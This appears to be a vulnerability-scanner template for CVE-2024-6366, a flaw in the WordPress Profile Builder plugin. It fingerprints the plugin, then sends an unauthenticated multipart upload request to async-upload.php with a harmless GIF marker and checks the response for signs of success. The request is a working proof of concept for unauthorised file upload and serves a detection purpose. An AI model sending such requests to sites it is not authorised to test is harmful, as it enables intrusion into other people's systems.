cve-id: CVE-2024-6366
set:
  filename: '{{to_lower(rand_text_alpha(12))}}'
rules:
- method: GET
  path: /
  expression: 'response.body.bcontains(b"/plugins/profile-builder") '
- method: POST
  path: /wp-admin/async-upload.php
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
  body: |
    ------WebKitFormBoundary7MA4YWxkTrZu0gW
    Content-Disposition: form-data; name="wppb_upload"
    true
    ------WebKitFormBoundary7MA4YWxkTrZu0gW
    Content-Disposition: form-data; name="meta_name"
    {{filename}}.gif
    ------WebKitFormBoundary7MA4YWxkTrZu0gW
    Content-Disposition: form-data; name="_wpnonce"
    e8
    ------WebKitFormBoundary7MA4YWxkTrZu0gW
    Content-Disposition: form-data; name="action"
    upload-attachment
    ------WebKitFormBoundary7MA4YWxkTrZu0gW
    Content-Disposition: form-data; name="async-upload"; filename="{{filename}}.gif"
    Content-Type: image/jpeg
    GIF89a
    ------WebKitFormBoundary7MA4YWxkTrZu0gW--
  expression: 'response.body.bcontains(b"success") && response.body.bcontains(b"id")
    && response.body.bcontains(b"uploadedTo") && response.status == 200 '
severity: high
type: fileupload
